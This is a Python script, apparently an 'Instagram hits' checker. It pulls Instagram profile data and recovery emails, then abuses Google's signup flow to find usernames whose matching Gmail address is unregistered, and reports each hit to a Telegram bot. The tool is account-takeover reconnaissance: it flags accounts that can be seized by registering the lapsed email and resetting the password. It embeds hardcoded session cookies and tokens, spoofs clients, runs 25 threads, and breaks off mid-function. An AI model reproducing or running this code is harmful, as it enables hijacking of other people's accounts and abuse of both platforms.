import os
try:
	import requests;from requests import get,post;from user_agent import generate_user_agent;import http.client,random,time,threading,json,datetime,sys;from time import sleep;import re;from random import randrange,choice;import telebot
except:
	os.system('pip install requests')
	os.system('pip install user_agent')
os.system('clear')
	
class Instagram:
	def __init__(self):
		self.day=str(random.randint(1,28))
		self.monthe=str(random.randint(1,12))
		self.year=str(random.randint(1990,2007))
		self.name="".join(random.choice('qwertyuiopasdfghjklzxcvbnm')for i in range(random.randrange(5,10)))
		self.tok=input('Token :')
		try:
			self.bot = telebot.TeleBot(self.tok)
		except Exception as e:
			print("Error initializing telebot:", e)
		self.id=input('ID :')
		os.system('clear')
		self.time=time.time()
		self.user_agent=str(generate_user_agent())
		self.TL_LIST=[]
		self.AT_LIST=[]
		self.S1_LIST=[]
		self.__Host_GAPS_LIST=[]
		self.tokens=[]
		self.good_insta=0
		self.bad_insta=0
		self.good_gmail=0
		self.bad_gmail=0
		for v in range(25):
			threading.Thread(target=self.serche).start()
	def rest(self,user):
		url = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/"
		payload = {
  'signed_body': "177927499eb32a742645875f8c7212fe4ff014a21db40f9bd6e52c6ace1f894e.{\"_csrftoken\":\"XoEv8Rgt1v4V8IrfQFnw0jXUFoF72Ld2\",\"adid\":\"3bcd0e16-964f-4d74-a151-6dd8cee96e71\",\"guid\":\"629d1711-3663-4456-b82d-b0400b5b838d\",\"device_id\":\"android-67dc2fda6b5c2041\",\"query\":\""+user+"\"}",
  'ig_sig_key_version': "4"
}

		headers = {
  'User-Agent': "Instagram 100.0.0.17.129 Android (30/11; 320dpi; 720x1448; realme; RMX3269; RED8F6; RMX3265; ar_IQ; 161478664)",
  'Accept-Encoding': "gzip, deflate",
  'X-Pigeon-Session-Id': "a91e0c92-9536-4b2d-8690-367b581ed93d",
  'X-Pigeon-Rawclienttime': "1743922705.304",
  'X-IG-Connection-Speed': "-1kbps",
  'X-IG-Bandwidth-Speed-KBPS': "-1.000",
  'X-IG-Bandwidth-TotalBytes-B': "0",
  'X-IG-Bandwidth-TotalTime-MS': "0",
  'X-IG-VP9-Capable': "false",
  'X-Bloks-Version-Id': "009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0",
  'X-IG-Connection-Type': "WIFI",
  'X-IG-Capabilities': "3brTvw==",
  'X-IG-App-ID': "567067343352427",
  'Accept-Language': "ar-IQ, en-US",
  'X-FB-HTTP-Engine': "Liger",
  'Cookie': "mid=Z9YT7QABAAEd2QWsqjUsmbV9sVHi; csrftoken=XoEv8Rgt1v4V8IrfQFnw0jXUFoF72Ld2"
}

		response = requests.post(url, data=payload, headers=headers).json()
#		print(response)
		try:
			return response['email']
		except:return 'None'
	def data(self,id):
	    try:
	           idd = int(id)
	           if 1 < idd < 1279000:
	           	return 2010
	           elif 1279001 < idd < 17750000:
	           	return 2011
	           elif 17750001 < idd < 279760000:
	           	return 2012
	           elif 279760001 < idd < 900990000:
	           	return 2013
	           elif 900990001 < idd < 1629010000:
	           	return 2014
	           elif 1900000000 < idd < 2500000000:
	           	return 2015
	           elif 2500000000 < idd < 3713668786:
	           	return 2016
	           elif 3713668786 < idd < 5699785217:
	           	return 2017
	           elif 5699785217 < idd < 8507940634:
	           	return 2018
	           elif 8507940634 < idd < 21254029834:
	           	return 2019
	           else:
	           	return "2020-2023"
	    except ValueError:
	    	return 'None'		
	def info(self,user):

	   headers = {
   'authority': 'www.instagram.com',
    'accept': '*/*',
    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',

    'referer': 'https://www.instagram.com/dd/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'x-asbd-id': '129477',
    'x-csrftoken': 'S1tFXRCsflUJCBKWav6rP8d0DsnfiEMP',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': 'hmac.AR07T_Q0xaDQfazO_ogFm4DlAfLnCNNeQ0b0skK1F4sWzJzO',
    'x-requested-with': 'XMLHttpRequest',
}


	   r = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={user}', headers=headers).json()
#	   print(r)
	   try:
	   	id=r["data"]["user"]["id"];name=r["data"]["user"]["full_name"];priv=r["data"]["user"]["is_private"];po=r["data"]["user"]["edge_owner_to_timeline_media"]["count"];fol=r["data"]["user"]["edge_followed_by"]["count"];folg=r["data"]["user"]["edge_follow"]["count"];bi=r["data"]["user"]["biography"];data=self.data(id);rest=self.rest(user);ff= (f"""

𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 
𝐈𝐍𝐒𝐓𝐀
═══════════════════
𝑫𝑬𝑽𝑬𝑳𝑶𝑷𝑬𝑹 : @jokerpython3 
═══════════════════
𝙽𝙰𝙼𝙴 : {name}
𝚁𝙴𝚂𝚃 : {rest}
𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : @{user}
𝙶𝙼𝙰𝙸𝙻: {user}@gmail.com
f𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : {fol}
f𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶 : {folg}
𝙳𝙰𝚃𝙰 : {data}
𝙿𝙾𝚂𝚃 : {po}
𝙸𝙳 : {id}
𝙿𝚁𝙸𝚅𝙰𝚃 : {priv}
𝙱𝙸𝙾 : {bi}
═══════════════════
""")
#	   	print(ff)
	   	self.bot.send_message(self.id,f'<strong>{ff}</strong>',parse_mode='html')
	   except Exception as e:
	        
            rest= self.rest(user)  
#            print(e)

            ff = (f"""
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 
𝐈𝐍𝐒𝐓𝐀
═══════════════════
𝑫𝑬𝑽𝑬𝑳𝑶𝑷𝑬𝑹 : @jokerpython3 
═══════════════════
𝚁𝙴𝚂𝚃 : {rest}
𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : @{user}
𝙶𝙼𝙰𝙸𝙻:  {user}@gmail.com
𝚄𝚁𝙻 : https://www.instagram.com/{user}/
═══════════════════
""")            	   	
            self.bot.send_message(self.id,f'<strong>{ff}</strong>',parse_mode='html')
	def generate_tokens(self):
	    while True:
	      try:
	        conn = http.client.HTTPSConnection('accounts.google.com')
	        headers = {
	        'authority': 'accounts.google.com',
	        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	        'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	
	        'referer': 'https://accounts.google.com/',
	        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-arch': '"x86"',
	    'sec-ch-ua-bitness': '"64"',
	    'sec-ch-ua-full-version': '"132.0.6961.0"',
	    'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-model': '""',
	    'sec-ch-ua-platform': '"Linux"',
	    'sec-ch-ua-platform-version': '""',
	    'sec-ch-ua-wow64': '?0',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	        'user-agent': self.user_agent,
	        'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
	    'x-client-data': 'CKb7ygE=',
	    }
	        conn.request(
	        'GET',
	        '/lifecycle/flows/signup?biz=false&continue=https%3A%2F%2Fwww.google.com%2F&flowEntry=SignUp&flowName=GlifWebSignIn&hl=ar',
	        headers=headers
	    )
	        response = conn.getresponse().info()
	#				print(response)
	        __Host_GAPS=str(response).split('Set-Cookie: __Host-GAPS=')[1].split(';')[0]
#	        print(__Host_GAPS)
	        TL=str(response).split('TL=')[1].split('\n')[0]
#	        print(TL)
	        break
	      except:''
#	    sleep(0.55)
	    while True:
	      try:
	        cookies = {
	
	    '__Host-GAPS': __Host_GAPS,
	
	}
	
	        headers = {
	    'authority': 'accounts.google.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	
	    'referer': 'https://accounts.google.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-arch': '"x86"',
	    'sec-ch-ua-bitness': '"64"',
	    'sec-ch-ua-full-version': '"132.0.6961.0"',
	    'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-model': '""',
	    'sec-ch-ua-platform': '"Linux"',
	    'sec-ch-ua-platform-version': '""',
	    'sec-ch-ua-wow64': '?0',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': self.user_agent,
	        'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
	    'x-client-data': 'CKb7ygE=',
	
	}
	
	        response = get(
	    'https://accounts.google.com/lifecycle/steps/signup/name?continue=https://www.google.com/&flowEntry=SignUp&flowName=GlifWebSignIn&hl=ar&TL='+TL,
	    cookies=cookies,
	    headers=headers,
	)
	#				print(response.text)
	        tok=re.findall(r'"(.*?)"',str(response.text).split('<!doctype html')[1].split('/lifecycle/_/AccountLifecyclePlatformSignupUi/')[0])
	        hl=tok[0]
	        s1=tok[31]
	        at=tok[38]	
#	        print(hl)
#	        print(s1)
#	        print(at)
	        break
	      except:''
	    sleep(0.66)
	    while True:
	      try:
	        cookies = {
	
	      '__Host-GAPS': __Host_GAPS,
	  }
	
	        headers = {
	      'authority': 'accounts.google.com',
	      'accept': '*/*',
	      'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	      'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
	
	      'origin': 'https://accounts.google.com',
	      'referer': 'https://accounts.google.com/',
	      'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-arch': '"x86"',
	    'sec-ch-ua-bitness': '"64"',
	    'sec-ch-ua-full-version': '"132.0.6961.0"',
	    'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-model': '""',
	    'sec-ch-ua-platform': '"Linux"',
	    'sec-ch-ua-platform-version': '""',
	    'sec-ch-ua-wow64': '?0',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	      'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
	    'x-client-data': 'CKb7ygE=',
	      'user-agent': self.user_agent,
	
	      'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
	      'x-goog-ext-391502476-jspb': '["'+s1+'"]',
	      'x-same-domain': '1',
	  }
	
	        params = {
	    'rpcids': 'E815hb',
	    'source-path': '/lifecycle/steps/signup/name',
	    'f.sid': '8978853623765669765',
	    'bl': 'boq_identity-account-creation-evolution-ui_20250326.08_p0',
	      'hl': hl,
	      'TL': TL,
	          '_reqid': '211429',
	    'rt': 'c',
	  }
	
	        data =f'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{self.name}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'
	
	        response = post(
	      'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
	      params=params,
	      cookies=cookies,
	      headers=headers,
	      data=data,
	  )
	#				print(response.text)
	        break
	      except:''
	    sleep(0.77)
	    while True:
	      try:
	        cookies = {
	
	    '__Host-GAPS': __Host_GAPS,
	}
	
	        headers = {
	    'authority': 'accounts.google.com',
	    'accept': '*/*',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
	
	    'origin': 'https://accounts.google.com',
	    'referer': 'https://accounts.google.com/',
	
	    'user-agent': self.user_agent,
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-arch': '"x86"',
	    'sec-ch-ua-bitness': '"64"',
	    'sec-ch-ua-full-version': '"132.0.6961.0"',
	    'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-model': '""',
	    'sec-ch-ua-platform': '"Linux"',
	    'sec-ch-ua-platform-version': '""',
	    'sec-ch-ua-wow64': '?0',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	        'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
	    'x-client-data': 'CKb7ygE=',
	    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
	    'x-goog-ext-391502476-jspb': '["'+s1+'"]',
	    'x-same-domain': '1',
	}
	
	        params = {
	    'rpcids': 'eOY7Bb',
	    'source-path': '/lifecycle/steps/signup/birthdaygender',
	    'f.sid': '8978853623765669765',
	    'bl': 'boq_identity-account-creation-evolution-ui_20250326.08_p0',
	    'hl': hl,
	    'TL': TL,
	        '_reqid': '511429',
	    'rt': 'c',
	}
	
	        data = f'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{self.year}%2C{self.monthe}%2C{self.day}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3C9DhqOGACAAbWyV7d9smN1Fj1BhGu2kD0ADQBEArZ1BEXNLyI5-8BjrmLyXtGvzl3ug8vcS6fQtKliMqas7gU0cgzeU4laHRfGd0YWw4pzQAAA6KdAAAAS6cBB7EATblKaR6s5pNCKJs5mEGthhmleu-r3Xo5hSJNRAauyg4v5skBckose53xFQqte8m0HIrBUQnpKf8nDOFrMZnUTicpBf0Sc9qDQO2ukxn-Vgdm7q4HRyGuSQKcuU824K74Hr2ukVouHFJDF1e0Q3e4TvTPaOmojQriThEylRK1juRB9JJLKyAv7IE6N6wVbAoFlvDMGwT9C63F0JbM5dYEc5oW4RtEyTmlTTbonArsQvJW67bOd5zj7XlH8i-PcvM1hz3wUMdxEtvfxmiJMJnNm2284eFS1Xn1okcq_0Z855Pwr1TfJiUScwFak2mAWvV22XiuhWyYKOoJhJyNxEMZ1dNBB1ZNLXAFHJr5weD1nhwnDN6sKgiYCMrTTD34MxJ8_yh9zM8QO7a6ctoFqhdH1-62XQp71laKaF-xnia9qf2HCAOlkFHYUVcgCp2oOBfB283MFkWdJZqYrhrn_aR-nR1zvZHRtW9XAdBK1SEwG_dQ32Qc397NPLbdBmmlFUOnzcbuh2fm3G6jDBt-x-1NlBNyqyb0qFoy_pglS_tw5UH7OAPkDf6pW1wCUc4RhjSrGL5kxQLq1Qc1r0bH9znWaj01R_pbwKfzp6QFKUUkS1_BnwxiWbReesMeGmOE8DlmKFba40yCKtsaMGl_f1cDmENBX8hnhFAVw97eQHEdXQdLntjakxPP6VK_BVYy--XjzpKREbutgqFCSpMIBdhXArYcuYfa0wAvIWNGhEEIMCp2pT2zmE7c-SkFBiNJHgf0Yt9APPMKJG_YgGxLsmCVgn2u8qDcAlmcy6YGpG7ycgliLONGt5TBpAlf8_kkuAAG63GQqsbTXFAjrKzsEhV7B5qaVSRTT73Rz3DHH9hzXpJ7pjQHvEhwXl7yYdoBRdKCqZneyaafKnuoTCB5Tz46ew_kvyVXsC8m8SNGXlf70hnj3A-a1jNCk-QynvV2UB-07JlJYm0jbGhFSTBaw38OT0vNM1d8ie3GM9XIUD4t9YIbAjmJ6aDH1cCXfg95RcCgQp37GQZ3dAFCnbqmhG2q6nw4Zal43VFl5M9TgKv15FwAGb35CyxzSX8gceN7JViuGOeiSor0DY-dIr1e2Ypaqd52yc0Wu5Gp_EOoKrX8vGuF_xa3gLciVCQH-ArV9u4ZPE-945EHkI3pJzIuT9-XW9I59-HQzIRCHqrB9OZzIqXJf4KEtA3NtwTgfMtGwQSRF0cI86a0390g_s9JGO_GnPYHNpd8yDRXcF85CnvhjyDsLQrBhE9J8JCnu7r5L020bwSoFB9Bz5ncD1IEk_pXiCYDqsTVJMrbsqRoEBPO4bsKLFIcLT9x0Q7F0Jt8mI0Cwt9_Sbe4FLmDfxe2Wh6ZlztHOqCvZFmPQqbOEP0Grxe8p87xJdMIrRBEm2jYxFsXsRqjMgKY5zM54xyQ2H5hqfXlxqc4gpTPAeYeyB4HLdh0Vhjm5QPndBgiakeEtZV9hN_Tu-3Xp2GQDQeTzK1JAVN7p8Co2ONDk-x6Jz0wvBCics9gh6xP0rUMMFnUbXK2vWnuwXPM97619daGOanhd22XQbm3fMM8O8rx8wTjma-6cmHBrNqOWGMlqzOnI7S1PhV9GxdkFilNKE0zi8n-Ha8Tf_XcgtWQ-2XfkmRmiR1I_5xnFR3G-sYrE3z6LlCFqqP6urXl1MOCvgmeebrEhx0U1ohclnj5PzKO0nnsRE8RzK47imJFHRqVLVxJLKrY0d-YQeO3a8iaQL5AgbSe4GLA6cmNX2mTD9q9ujxsWC7xk55sU9nUo7_QvikwW7qIx_h2leWXqU0lvBojmTqkBy7lHQy8ccY1W4Y9DkNHmd4PQZGN4xEQdLaIOCpPDhjF284Yntj7bMLiM1MlWZHqFfepRi-r9p37cqJaqp7N7giFWWYegGR4ePJ_E-QwG-12RbM6Azf2hmikUYwP1UnjWMVYmpkRhcRxTGdY1N3MZBliZSxbU9ApIUS5TlU08I1sAROMoCNdBF7C7LAowRdL_-f3cIpMxX-XfJ6u3OzwCPL7csfu3weJnbTC-lywo6VxGKPjHHbwtlewRD90AbczFkk5O29QqGSa4WMBcf4C1u2vi7VO-D9nfit-ImcMM7JsmC7JL2XLybYGLnZ7rpq292Q7qs0aSHINJGGE9cgNF5xY7ONrny29T0_VBeyGIplpnSkuTS7-WQCbunVC6_qf02n_WYnLqK499RZnIflLTZes_4xKQQCk9EEUAEA-ch7fTD_135RKM14SzoO-rv4x6D92Kcf97LLJt5l26BdWZAk7j7p_18_gVTy0af3Mai35ZKcPthmshQ5Q8iXsAc0TK68TSTUwG5yySVVYB5VhHuqdRYdOhSwE9rOx0IuxN_mfQAo_imV1kqvQyFgkhH9Tj-6214nGMA6_XPoUoFvpYijvgIBVCWXPygkNgpD28hkYFJAQJ3y-oxDCwWbeOL4WOm7zbv5nG_CA9uumvYARutSGkVeGYPxL_MdTRFqXe3fkWemHZ7sgfJ4F5KXI5zbjBag-8zGwiBrf5dfaFKE37qrb2cAmZczVygsnULUcGsIGbyAr3UOBR5Phwwr_ol5LdNc5CXKJn15yVTe4sAOLvXtaXiE3he2qzAuaKAh4ZRMakSFnYj3yiw%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fwww.google.com%2F%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'
	
	        response = post(
	    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
#	        print(response.text)
	        break
	      except:''
	    ts=time.time()-self.time
	    try:
	      return {
	                    'tokens':{
	                        '__Host-GAPS':__Host_GAPS,
	                        'TL':TL,
	                        'hl':hl,
	                        'at':at,
	                        's1':s1,
	                    },
	                    'info':{
	                        'name':self.name,
	                        'birthday':{
	                            'day:month:year':self.day+':'+self.monthe+':'+self.year,
	                            'day':self.day,
	                            'month':self.monthe,
	                            'year':self.year,
	                            'by':'@jokerpython3',
	                            'message':'ني خماط',
	                            'hhhh':'ههه',
	                            'MyChannel':'https://t.me/vvvvxxv',
	                            'many_thank_to':'@Nate_D_Qredes/عثمان',
	                            'ILove':'@d_dwu / زجاد',
	                            #حبج
	
	                        },
	                        'time_get_tokens':ts,
	                        'time':time.time(),        
	                        'جاي امضرط حتى يصير 400 سطر'       :'jsjshhs',
	                        'datetime':'2025/3/31',
	                        'باجر عيد':'1446/10/1',
	                        'استغفرالله':'حمدلله',
	                        'ساعه بل ':'ثنيتن بل  ليل',
	
	                            },
	                    'errors':[],
	                }
	    except Exception as e:
	      return{
	        "tokens":{
	          '__Host-GAPS':str(e),
	          'TL':str(e),
	          'hl':str(e),
	          'at':str(e),
	          's1':str(e),
	          "Error":"Error_Get_Tokens",
	          "Error_message":str(e),
	          "Error_Time":str(time.time()),
	          "DateTime_Error":str(datetime.datetime.now()),
	          "Time":str(time.time()),
	          "Time_Error":str(ts),
	          
	          
	        },
	        'info':{
	                'name':self.name,
	                'birthday':{
	                    'day:month:year':self.day+':'+self.monthe+':'+self.year,
	                    'day':self.day,
	                    'month':self.monthe,
	                    'year':self.year,
	                    'by':'@jokerpython3',
	                    'message':'ني خماط',
	                    'hhhh':'ههه',
	                    'MyChannel':'https://t.me/vvvvxxv',
	                    'many_thank_to':'@Nate_D_Qredes/عثمان',
	                    'ILove':'@d_dwu / زجاد',
	                    #حبج
	
	                },
	                'time_Error_tokens':ts,
	                'time':time.time(),        
	                'جاي امضرط حتى يصير 400 سطر'       :'jsjshhs',
	                'datetime':'2025/3/31',
	                'باجر عيد':'1446/10/1',
	                'استغفرالله':'حمدلله',
	                'ساعه بل ':'ثنيتن بل  ليل',
	          
	
	                    },
	            'errors':[],
	        }
        
    
	def get_tokens(self):
	    while True:
	      try:
	        m=self.generate_tokens()['tokens']
	        TL=m['TL']
	        __Host_GAPS=m['__Host-GAPS']
	        at=m['at']
	        hl=m['hl']
	        s1=m['s1']
	        try:
	          os.remove('tokens.txt')
	        except:''
	        with open('tokens.txt','a') as f:
	          f.write(f'{TL}///{__Host_GAPS}///{at}///{hl}///{s1}')
	        return
	      except:""
 
	def check_tokens(self):
	    while True:
	      try:
	        try:
	              kse=open('tokens.txt','r').read().splitlines()[0].split('///')
	              TL=kse[0]
	              __Host_GAPS=kse[1]
	              at=kse[2]
	              hl=kse[3]
	              s1=kse[4]						
	        except:
	            self.get_tokens()
	            return
	        email=''.join(choice('azertyuiopmlkjhgfdsqwxcvbn1234567890.') for i in range(randrange(10,15)))		
	        cookies = {
	
	    '__Host-GAPS': __Host_GAPS,
	}
	
	        headers = {
	    'authority': 'accounts.google.com',
	    'accept': '*/*',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
	
	    'origin': 'https://accounts.google.com',
	    'referer': 'https://accounts.google.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-arch': '"x86"',
	    'sec-ch-ua-bitness': '"64"',
	    'sec-ch-ua-full-version': '"132.0.6961.0"',
	    'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-model': '""',
	    'sec-ch-ua-platform': '"Linux"',
	    'sec-ch-ua-platform-version': '""',
	    'sec-ch-ua-wow64': '?0',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
	    'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
	    'x-client-data': 'CKb7ygE=',
	    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
	    'x-goog-ext-391502476-jspb': '["'+s1+'"]',
	    'x-same-domain': '1',
	}
	
	        params = {
	    'rpcids': 'NHJMOd',
	    'source-path': '/lifecycle/steps/signup/username',
	    'f.sid': '86607038236019457',
	    'bl': 'boq_identity-account-creation-evolution-ui_20250326.08_p0',
	    'hl': hl,
	    'TL': TL,
	    '_reqid': '903690',
	    'rt': 'c',
	}
	
	        data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C1%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C183205%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'
	
	        response = requests.post(
	    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
#	        print(response.text)
	        if 'password' in response.text:
	          self.TL_LIST.append(TL)
	          self.AT_LIST.append(at)
	          self.S1_LIST.append(s1)
	          self.__Host_GAPS_LIST.append(__Host_GAPS)
	          self.tokens.append(kse)
	          return
	        else:
	          self.get_tokens()
	          return			
	      except:""
	def check_gmail(self,user):
	    try:
	      self.check_tokens()
	      m=open("tokens.txt").read().splitlines()[0].split("///")
	      TL=m[0]
	      __Host_GAPS=m[1]
	      at=m[2]
	      hl=m[3]
	      s1=m[4]		
	      
	      cookies = {
	
	    '__Host-GAPS': __Host_GAPS,
	}
	
	      headers = {
	    'authority': 'accounts.google.com',
	    'accept': '*/*',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
	
	    'origin': 'https://accounts.google.com',
	    'referer': 'https://accounts.google.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-arch': '"x86"',
	    'sec-ch-ua-bitness': '"64"',
	    'sec-ch-ua-full-version': '"132.0.6961.0"',
	    'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-model': '""',
	    'sec-ch-ua-platform': '"Linux"',
	    'sec-ch-ua-platform-version': '""',
	    'sec-ch-ua-wow64': '?0',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
	    'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
	    'x-client-data': 'CKb7ygE=',
	    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
	    'x-goog-ext-391502476-jspb': '["'+s1+'"]',
	    'x-same-domain': '1',
	}
	
	      params = {
	    'rpcids': 'NHJMOd',
	    'source-path': '/lifecycle/steps/signup/username',
	    'f.sid': '86607038236019457',
	    'bl': 'boq_identity-account-creation-evolution-ui_20250326.08_p0',
	    'hl': hl,
	    'TL': TL,
	    '_reqid': '903690',
	    'rt': 'c',
	}
	
	      data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{user}%5C%22%2C1%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C183205%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'
	
	      res= post(
	    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	).text
#	      print(res)
	      if "password" in res:
	        self.info(user)
	        self.good_gmail+=1
	        sys.stdout.write(f'''\rHits : {self.good_gmail} Bad insta : {self.bad_insta} Bad gmail : {self.bad_gmail} Good insta : {self.good_insta}\r''')
	        sys.stdout.flush()
	        
	      else:
	      	self.bad_gmail+=1
	      	sys.stdout.write(f'''\rHits : {self.good_gmail} Bad insta : {self.bad_insta} Bad gmail : {self.bad_gmail} Good insta : {self.good_insta}\r''')
	      	sys.stdout.flush()
	      	
	    except:""
	def check(self,user):
		url = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/"
		em=user+'@gmail.com'
		payload = {
  'signed_body': "177927499eb32a742645875f8c7212fe4ff014a21db40f9bd6e52c6ace1f894e.{\"_csrftoken\":\"XoEv8Rgt1v4V8IrfQFnw0jXUFoF72Ld2\",\"adid\":\"3bcd0e16-964f-4d74-a151-6dd8cee96e71\",\"guid\":\"629d1711-3663-4456-b82d-b0400b5b838d\",\"device_id\":\"android-67dc2fda6b5c2041\",\"query\":\""+em+"\"}",
  'ig_sig_key_version': "4"
}

		headers = {
  'User-Agent': "Instagram 100.0.0.17.129 Android (30/11; 320dpi; 720x1448; realme; RMX3269; RED8F6; RMX3265; ar_IQ; 161478664)",
  'Accept-Encoding': "gzip, deflate",
  'X-Pigeon-Session-Id': "a91e0c92-9536-4b2d-8690-367b581ed93d",
  'X-Pigeon-Rawclienttime': "1743922705.304",
  'X-IG-Connection-Speed': "-1kbps",
  'X-IG-Bandwidth-Speed-KBPS': "-1.000",
  'X-IG-Bandwidth-TotalBytes-B': "0",
  'X-IG-Bandwidth-TotalTime-MS': "0",
  'X-IG-VP9-Capable': "false",
